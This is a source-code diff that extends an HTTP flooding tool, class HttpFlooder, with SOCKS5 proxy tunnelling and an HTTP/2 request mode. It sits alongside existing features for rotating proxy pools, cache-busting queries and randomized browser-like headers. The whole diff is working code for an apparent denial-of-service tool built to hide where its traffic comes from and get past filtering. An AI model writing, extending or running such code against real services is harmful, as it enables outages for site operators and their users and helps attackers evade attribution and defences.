@@ -10,10 +10,12 @@ import time
 from dataclasses import dataclass, field
 
 from .adaptive import AdaptiveController
+from .h2 import H2Connection
 from .metrics import Metrics
 from .payloads import PayloadStrategy
 from .proxypool import Proxy, ProxyPool
 from .scope import Target
+from .socks import SocksError, socks5_connect
 
 
 @dataclass
@@ -28,6 +30,7 @@ class HttpProfile:
     query_buster: bool = True
     max_retries: int = 0
     retry_backoff: float = 0.1
+    http2: bool = False
 
 
 class RateLimiter:
@@ -142,6 +145,17 @@ class HttpFlooder:
                 timeout=self.timeout,
             )
 
+        if proxy.scheme.startswith("socks"):
+            reader, writer = await socks5_connect(
+                proxy.host, proxy.port,
+                self.target.host, self.target.port,
+                proxy.username, proxy.password,
+                timeout=self.timeout,
+            )
+            if ssl_ctx is not None:
+                await writer.start_tls(ssl_ctx, server_hostname=self.target.host)
+            return reader, writer
+
         # HTTP CONNECT tunnel through the proxy, then TLS inside if needed
         reader, writer = await asyncio.wait_for(
             asyncio.open_connection(proxy.host, proxy.port, limit=65536),
@@ -158,6 +172,8 @@ class HttpFlooder:
         head = await asyncio.wait_for(reader.readuntil(b"\r\n\r\n"), timeout=self.timeout)
         if b" 200 " not in head.split(b"\r\n", 1)[0] + b" ":
             raise ConnectionError(f"proxy CONNECT rejected: {head.split(b'\r\n',1)[0]!r}")
+        if ssl_ctx is not None:
+            await writer.start_tls(ssl_ctx, server_hostname=self.target.host)
         return reader, writer
 
     def _build_request(self) -> tuple[bytes, bool]:
@@ -215,6 +231,37 @@ class HttpFlooder:
         self.metrics.record(status, time.perf_counter() - start, size)
         return True, status
 
+    async def _one_request_h2(self, conn, reader, writer) -> tuple[bool, int]:
+        p = self.profile
+        start = time.perf_counter()
+        headers = [
+            (":method", p.method),
+            (":scheme", self.target.scheme),
+            (":authority", self.target.netloc),
+            (":path", self._payload.path(self.target.path, p.method == "GET")),
+        ]
+        extra = self._payload.headers(self.target.netloc) if p.randomize_ua else {}
+        body = p.body
+        if not body and p.strategy != PayloadStrategy.BROWSER:
+            body, ctype = self._payload.body()
+            if ctype:
+                extra["content-type"] = ctype
+        for k, v in p.headers:
+            extra[k] = v
+        for k, v in extra.items():
+            if k.lower() in ("host", "connection", "transfer-encoding", "upgrade"):
+                continue
+            headers.append((k.lower(), v))
+
+        resp = await conn.request(headers, body, timeout=self.timeout)
+        latency = time.perf_counter() - start
+        if resp.error:
+            self.metrics.record_error(resp.error, latency)
+            return False, 0
+        size = len(resp.body) + sum(len(k) + len(v) for k, v in resp.headers)
+        self.metrics.record(resp.status, latency, size)
+        return True, resp.status
+
     async def worker(self, wid: int, stop: asyncio.Event | None = None) -> None:
         stop = stop or self._stop
         ssl_ctx = self._ssl_ctx()
@@ -230,6 +277,11 @@ class HttpFlooder:
                 if proxy:
                     proxy.mark_success()
 
+                h2conn = None
+                if self.profile.http2:
+                    h2conn = H2Connection(reader, writer)
+                    await h2conn.handshake()
+
                 for _ in range(self.per_conn_requests):
                     if stop.is_set() or self._stop.is_set():
                         break
@@ -241,7 +293,12 @@ class HttpFlooder:
                     try:
                         while True:
                             try:
-                                ok, _ = await self._one_request(writer, reader)
+                                if h2conn is not None:
+                                    ok, _ = await self._one_request_h2(h2conn, reader, writer)
+                                    if not ok:
+                                        break
+                                else:
+                                    ok, _ = await self._one_request(writer, reader)
                                 break
                             except (ConnectionError, OSError) as exc:
                                 attempt += 1
